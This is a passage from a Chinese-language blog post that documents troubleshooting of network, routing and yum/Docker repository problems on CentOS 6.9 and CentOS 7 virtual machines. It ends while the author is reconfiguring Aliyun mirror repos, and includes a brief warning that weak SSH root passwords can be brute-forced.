style="zoom:40%;"><p>目前是静态ip配置。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.07.03.png" style="zoom:40%;"><p>eth1的配置如上，把eth1配置为dhcp获取IP。配置</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.11.53.png" alt="截屏2024-12-12 10.11.53" style="zoom:40%;"><p>/etc/init.d/network restart 【重启网卡】</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.13.04.png" style="zoom:35%;"><p>判断是网卡没有连接，检查虚拟机配置进行验证。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.14.34.png" style="zoom:50%;"><p>将网卡2设置为NAT模式并连接。/etc/init.d/network restart 【重启网卡】</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.15.31.png" alt="截屏2024-12-12 10.15.31" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.16.03.png" style="zoom:40%;"><p>ip配置成功，但还是无法连接互联网。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.17.16.png" style="zoom:40%;"><p>查看路由表，route -n</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.21.27.png" style="zoom:50%;"><p>第二条记录的网关是0.0.0.0，最终绕到了192.168.2.1。</p><p>这里的关键是默认路由，它定义了当没有特定路由匹配时数据包的去向。在您的路由表中，默认路由的网关是 <code>192.168.2.1</code>，这意味着所有非本地目的地的数据包都将通过 <code>eth0</code> 接口发送到这个网关。</p><p>编辑eth1的配置文件，添加网关：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.01.png" style="zoom:50%;"><p>仍然无法ping通互联网。检查路由发现没有更新网关。「估计忘记重启网卡了！」</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.26.37.png" alt="截屏2024-12-12 10.26.37" style="zoom:50%;"><p>/etc/init.d/network restart 重启网卡。网关配置生效。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.27.37.png" alt="截屏2024-12-12 10.27.37" style="zoom:50%;"><p>互联网成功ping通。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.28.01.png" style="zoom:50%;"><ul><li>复盘</li></ul><p>事实上排查网络问题只要把握路由表、网卡设置两个环节即可。</p><p>我的虚拟机设置了两块网卡，对应eth0和eth1，eth0之前配置过静态ip，且在192.168.2.0/24网段，跟网关192.168.155.1/24不在一个网段，所以一开始就ping不同192.168.155.1的网关，更不可能ping通百度。</p><p>对eth1网卡进行dhcp的设置，连接网卡硬件之后重启网卡服务获得ip（NAT模式下这个ip跟宿主机ip192.168.155.1是同网段的），发现仍然无法ping通网关，查看路由表发现eth1走的是默认网关，默认最终指向192.168.2.1（这个是192.168.2.0/24的网关），所以流量出不去。</p><p>最后修改eth1的网关设置，重启网卡，路由表生效之后，成功ping通互联网。</p></blockquote><h2 id="1-2-卸载旧版Docker"><a href="#1-2-卸载旧版Docker" class="headerlink" title="1.2 卸载旧版Docker"></a>1.2 卸载旧版Docker</h2><p>首先如果系统中已经存在旧的Docker，则先卸载：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum remove <span class="token function">docker</span> <span class="token punctuation">\</span>    docker-client <span class="token punctuation">\</span>    docker-client-latest <span class="token punctuation">\</span>    docker-common <span class="token punctuation">\</span>    docker-latest <span class="token punctuation">\</span>    docker-latest-logrotate <span class="token punctuation">\</span>    docker-logrotate <span class="token punctuation">\</span>    docker-engine <span class="token punctuation">\</span>    docker-selinux <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.41.30.png" alt="截屏2024-12-12 10.41.30"></p><p>我的虚拟机上没有需要删除的docker相关的包。</p><h2 id="1-3-配置Docker的yum源"><a href="#1-3-配置Docker的yum源" class="headerlink" title="1.3  配置Docker的yum源"></a>1.3  配置Docker的yum源</h2><ul><li>yum工具包安装</li></ul><p>首先要安装一个yum工具。</p><pre class="line-numbers language-Bash" data-language="Bash"><code class="language-Bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.42.52.png" alt="截屏2024-12-12 10.42.52"></p><p>系统上已经存在。</p><ul><li>配置yum源</li></ul><p>安装成功后，执行命令，配置Docker的yum源（已更新为阿里云源）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo<span class="token function">sudo</span> <span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</span> /etc/yum.repos.d/docker-ce.repo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.44.31.png" alt="截屏2024-12-12 10.44.31" style="zoom:50%;"><blockquote><p>sudo sed -i ‘s+download.docker.com+mirrors.aliyun.com/docker-ce+’ /etc/yum.repos.d/docker-ce.repo</p><p>命令解释：</p><ol><li><code>sed</code>: 调用sed工具，它是一个流编辑器，用于对文本进行过滤和替换。</li><li><code>-i</code>: 选项告诉sed直接在文件中进行编辑，而不是输出到标准输出（即终端）。这会导致原文件被修改。</li><li><code>'s+download.docker.com+mirrors.aliyun.com/docker-ce+'</code>: 这是一个sed的替换命令，它指示sed执行以下操作：<ul><li><code>s</code>: 表示替换（substitute）。</li><li><code>+</code>: 在sed中用作分隔符，这里它替代了默认的空格分隔符，因为默认的空格在URL中会出现，使用<code>+</code>可以避免这种情况。</li><li><code>download.docker.com</code>: 这是要被替换的字符串，即原始的Docker镜像源地址。</li><li><code>mirrors.aliyun.com/docker-ce</code>: 这是替换后的字符串，即阿里云的Docker镜像源地址。</li></ul></li><li><code>/etc/yum.repos.d/docker-ce.repo</code>: 指定了要编辑的文件路径。这个文件是Docker CE（社区版）的YUM仓库配置文件。</li></ol></blockquote><ul><li>更新yum，建立缓存</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum makecache fast<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><ul><li>问题解决</li><li>报错：<br>Loaded plugins: fastestmirror, refresh-packagekit, security<br>Loading mirror speeds from cached hostfile<br><a href="https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml">https://mirrors.aliyun.com/docker-ce/linux/centos/6/x86_64/stable/repodata/repomd.xml</a>: [Errno 14] PYCURL ERROR 22 - “The requested URL returned error: 404 Not Found”<br>Trying other mirror.<br>To address this issue please refer to the below knowledge base article<br><a href="https://access.redhat.com/articles/1320623">https://access.redhat.com/articles/1320623</a><br>If above article doesn’t help to resolve this issue please open a ticket with Red Hat Support.<br>Error: Cannot retrieve repository metadata (repomd.xml) for repository: docker-ce-stable. Please verify its path and try again</li><li>尝试解决：</li></ul><p>​      <strong>检查仓库地址</strong>：确认在 <code>/etc/yum.repos.d/docker-ce.repo</code> 文件中配置的阿里云Docker镜像源地址是正确的。您可以访问阿里云的官方文档或镜像源页面来获取最新的镜像源地址。</p><p>​      检查发现，docker-ce.repo文件中存在一些之前就有的yum源配置。如图。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2010.56.34.png" style="zoom:50%;"><p>​     尝试将这个文件备份，然后删除，重新生执行命令生成新的配置文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> <span class="token parameter variable">-r</span> /etc/yum.repos.d /etc/yum.repos.d/docker-ce.backfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.00.00.png" alt="截屏2024-12-12 11.00.00"></p><p>重新生成。</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2011.01.36.png" alt="截屏2024-12-12 11.01.36"></p><p>重新生成的文件仍然是旧的源。</p><p>其实上面的解决思路有问题，因为这个链接<a href="https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%B0%B1%E6%98%AF%E5%B8%A6%E6%9C%89%E7%89%88%E6%9C%AC%EF%BC%88$releasever%EF%BC%89%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%9B%AE%E5%89%8D%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%89%88%E6%9C%AC%E6%98%AFcentos6.9%E5%B9%B6%E4%B8%94%E5%AE%98%E6%96%B9%E4%B9%9F%E4%B8%8D%E7%BB%B4%E6%8A%A4%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E7%9A%84yum%E6%BA%90%E4%BB%93%E5%BA%93%E4%BA%86%EF%BC%8C%E6%89%80%E4%BB%A5sudo">https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo下载的文件内容，就是带有版本（$releasever）的，因为目前的虚拟机版本是centos6.9并且官方也不维护这个版本的yum源仓库了，所以sudo</a> yum makecache fast的时候才会报错。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>docker-ce-stable<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>Docker CE Stable - <span class="token variable">$basearch</span><span class="token assign-left variable">baseurl</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/<span class="token variable">$releasever</span>/<span class="token variable">$basearch</span>/stable<span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>https://mirrors.aliyun.com/docker-ce/linux/centos/gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>能想到的最直接的两个办法：</p><ol><li><strong>升级操作系统</strong>：最直接的解决方案是升级到一个受支持的 CentOS 版本，如 CentOS 7 或 CentOS 8。这样可以继续获得官方的维护和更新。</li><li><strong>寻找其他镜像源</strong>：您可以寻找其他提供 CentOS 6.9 镜像的源。例如，一些第三方可能仍然提供 CentOS 6.9 的镜像。但请注意，使用第三方源可能会带来安全风险，因为它们可能不会及时更新安全补丁。</li></ol><p>其他的yum源也没有找到合适的。目前貌似本机的其他yum源也有些问题。</p><p>如果设置本机的yum源可以参考：</p><p><a href="https://www.cnblogs.com/hunttown/p/18225058">https://www.cnblogs.com/hunttown/p/18225058</a> </p><p>但centos6.9确实是有点过时了，打算安装一个centos7版本的虚拟机。</p></blockquote><h1 id="二、-centos7"><a href="#二、-centos7" class="headerlink" title="二、 centos7"></a>二、 centos7</h1><h2 id="2-1-安装centos7"><a href="#2-1-安装centos7" class="headerlink" title="2.1 安装centos7"></a>2.1 安装centos7</h2><ul><li>选择创建自定虚拟机。</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.29.13.png" style="zoom:50%;"><ul><li>选择linux，CentOS 7 64位</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.31.54.png" style="zoom:50%;"><ul><li>选择传统BIOS</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.33.26.png" style="zoom:50%;"><blockquote><h4 id="BIOS是什么？"><a href="#BIOS是什么？" class="headerlink" title="BIOS是什么？"></a>BIOS是什么？</h4><p>BIOS（Basic Input/Output System，基本输入输出系统）是计算机启动时加载的第一个软件，它是一个固件程序，存储在计算机主板上的一个芯片中。BIOS的主要功能包括：</p><ol><li><strong>硬件初始化</strong>：在操作系统加载之前，BIOS负责对计算机的硬件组件进行初始化，包括CPU、内存、硬盘、显卡等。</li><li><strong>启动顺序设置</strong>：BIOS允许用户设置启动设备的优先级，比如从硬盘、光盘、USB设备或网络启动。</li><li><strong>硬件检测</strong>：在启动过程中，BIOS会检测系统中的硬件设备，确保它们正常工作。</li><li><strong>操作系统引导</strong>：BIOS通过引导扇区（boot sector）加载操作系统的引导程序，然后将控制权交给操作系统。</li><li><strong>系统设置</strong>：BIOS提供了一个设置界面，用户可以配置系统的各种参数，如时间、日期、启动顺序、CPU频率等。</li><li><strong>错误报告</strong>：如果硬件初始化过程中出现问题，BIOS会通过屏幕显示错误信息，帮助用户诊断问题。</li></ol><p>随着技术的发展，BIOS逐渐被UEFI（Unified Extensible Firmware Interface，统一可扩展固件接口）所取代。UEFI提供了更多的功能，如更大的存储空间、图形界面、安全启动等，并且支持大于2.2TB的硬盘和64位操作系统。然而，BIOS和UEFI在概念上是相似的，都是计算机启动过程中的关键组件。</p><h4 id="安装虚拟机的时候选BIOS还是UEFI，有什么区别？"><a href="#安装虚拟机的时候选BIOS还是UEFI，有什么区别？" class="headerlink" title="安装虚拟机的时候选BIOS还是UEFI，有什么区别？"></a>安装虚拟机的时候选BIOS还是UEFI，有什么区别？</h4><p>在安装虚拟机时选择BIOS或UEFI取决于操作系统需求、虚拟机软件支持及个人偏好。BIOS（基本输入输出系统）兼容性强，适合旧操作系统，但功能有限，如最大2TB硬盘和4GB内存限制。UEFI（统一可扩展固件接口）是现代标准，支持大容量硬盘、更多内存，提供安全启动和快速启动特性。若操作系统和虚拟机软件支持，且需要高级功能，UEFI是优选。然而，对于旧系统或特殊需求，BIOS可能更合适。选择前，应考虑操作系统兼容性、虚拟机软件功能及个人对配置的熟悉程度。</p></blockquote><ul><li>选择新建虚拟盘</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.12.png" style="zoom:50%;"><ul><li>点击完成</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.51.51.png" style="zoom:50%;"><ul><li>存储</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.52.30.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.12.png" style="zoom:40%;"><ul><li>安装镜像</li></ul><p>虚拟机=&gt;设置=&gt;CD/DVD（IDE）</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.54.48.png" style="zoom:40%;"><p>选择镜像并连接</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.56.06.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.57.08.png" style="zoom:40%;"><p>选择第一项或第二项。回车。</p><ul><li>系统安装</li></ul><p>选择语言：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2015.59.31.png" style="zoom:30%;"><p>继续设置</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.00.26.png" style="zoom:30%;"><p>选择DATE&amp;TIME，设置时间一般选择上海。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.03.46.png" style="zoom:30%;"><p>点击SOFTWARE SELECTION 进入环境选择，这个镜像为最小化镜像，所以只有一个选项。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.05.48.png" style="zoom:30%;"><p>点击完成后进入安装目标位置，直接点击完成</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.06.37.png" style="zoom:30%;"><p>点击网络，打开，然后点击完成。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.07.28.png" style="zoom:30%;"><p>点击开始安装。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.08.png" style="zoom:30%;"><p>设置密码：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.08.33.png" style="zoom:30%;"><p>耐心等待安装完成。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.09.15.png" style="zoom:30%;"><p>完成后点击重启。</p><h2 id="2-2-问题解决"><a href="#2-2-问题解决" class="headerlink" title="2.2 问题解决"></a>2.2 问题解决</h2><p>登录：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.14.05.png" style="zoom:50%;"><p>ifconfig命令不存在：</p><h3 id="2-2-1-网络连通问题解决"><a href="#2-2-1-网络连通问题解决" class="headerlink" title="2.2.1 网络连通问题解决"></a>2.2.1 网络连通问题解决</h3><p>ip addr查看网络地址：</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.18.24.png" alt="截屏2024-12-12 16.18.24"></p><p>yum 安装net-tools</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> net-tools<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.19.38.png" alt="截屏2024-12-12 16.19.38"></p><p>看样子是网络的问题，得先解决网络问题。</p><ul><li>解决网路连接问题</li></ul><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.22.08.png" style="zoom:50%;"><p>配置：目前只保留了这几项，</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.24.36.png" style="zoom:50%;"><p>重启网卡：</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.03.png" style="zoom:50%;"><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.26.36.png" alt="截屏2024-12-12 16.26.36"></p><p>成功获取到IP，192.168.155.34.</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.27.14.png" alt="截屏2024-12-12 16.27.14" style="zoom:50%;"><p>成功ping通互联网。</p><h3 id="2-2-2-安装net-tools工具包"><a href="#2-2-2-安装net-tools工具包" class="headerlink" title="2.2.2 安装net-tools工具包"></a>2.2.2 安装net-tools工具包</h3><p>yum update报错。</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.28.59.png" alt="截屏2024-12-12 16.28.59" style="zoom:50%;"><p>图片中的错误信息表明 <code>yum</code> 在尝试更新时无法从 CentOS 的镜像列表中检索信息，因为无法解析 <code>mirrorlist.centos.org</code> 的主机名。这可能是由于网络连接问题、DNS 解析问题或 CentOS 镜像源配置问题。</p><p>后面配置完成yum源之后再安装。</p><h3 id="2-2-3-用mac终端进行ssh连接管理"><a href="#2-2-3-用mac终端进行ssh连接管理" class="headerlink" title="2.2.3 用mac终端进行ssh连接管理"></a>2.2.3 用mac终端进行ssh连接管理</h3><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.32.53.png" alt="截屏2024-12-12 16.32.53"></p><p>【这里提一个点，默认安装开启ssh服务，如果设置的时候用了弱口令，用nmap等扫描攻击发现ip:port之后，可以直接用hydra爆破登录，而且登录就是root用户。】</p><h3 id="2-2-4-配置yum源"><a href="#2-2-4-配置yum源" class="headerlink" title="2.2.4 配置yum源"></a>2.2.4 配置yum源</h3><p>备份原始文件</p><pre class="line-numbers language-none"><code class="language-none">cd /etc/yum.repos.dmv CentOS-Base.repo CentOS-Base.repo.bak<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>修改 CentOS-Base.repo 文件</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># CentOS-Base.repo</span><span class="token comment">#</span><span class="token comment"># The mirror system uses the connecting IP address of the client and the</span><span class="token comment"># update status of each mirror to pick mirrors that are updated to and</span><span class="token comment"># geographically close to the client.  You should use this for CentOS updates</span><span class="token comment"># unless you are manually picking other mirrors.</span><span class="token comment">#</span><span class="token comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><span class="token comment"># remarked out baseurl= line instead.</span><span class="token comment">#</span><span class="token comment">#</span> <span class="token punctuation">[</span>base<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Base - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/os/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#released updates </span><span class="token punctuation">[</span>updates<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Updates - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/updates/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that may be useful</span><span class="token punctuation">[</span>extras<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Extras - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/extras/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#additional packages that extend functionality of existing packages</span><span class="token punctuation">[</span>centosplus<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Plus - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/centosplus/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6 <span class="token comment">#contrib - packages by Centos Users</span><span class="token punctuation">[</span>contrib<span class="token punctuation">]</span><span class="token assign-left variable">name</span><span class="token operator">=</span>CentOS-<span class="token variable">$releasever</span> - Contrib - mirrors.aliyun.com<span class="token assign-left variable">failovermethod</span><span class="token operator">=</span>priority<span class="token assign-left variable">baseurl</span><span class="token operator">=</span>http://mirrors.aliyun.com/centos-vault/centos/<span class="token variable">$releasever</span>/contrib/<span class="token variable">$basearch</span>/<span class="token assign-left variable">gpgcheck</span><span class="token operator">=</span><span class="token number">1</span><span class="token assign-left variable">enabled</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">gpgkey</span><span class="token operator">=</span>file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>【后面的踩的坑，gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6改成gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-7】</p><ul><li>清理更新缓存</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#清空yum缓存</span>yum clean all<span class="token comment">#重建yum缓存</span>yum makecache<span class="token comment">#列出yum列表</span>yum list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/centos-xu-ni-ji-an-zhuang-ji-wen-ti-jie-jue/%E6%88%AA%E5%B1%8F2024-12-12%2016.41.24.png" style="zoom:30%;"><h3 id="2-4-5-重新安装net-tools"><a href="#2-4-5-重新安装net-tools" class="headerlink" title="2.4.5 重新安装net-tools"></a>2.4.5 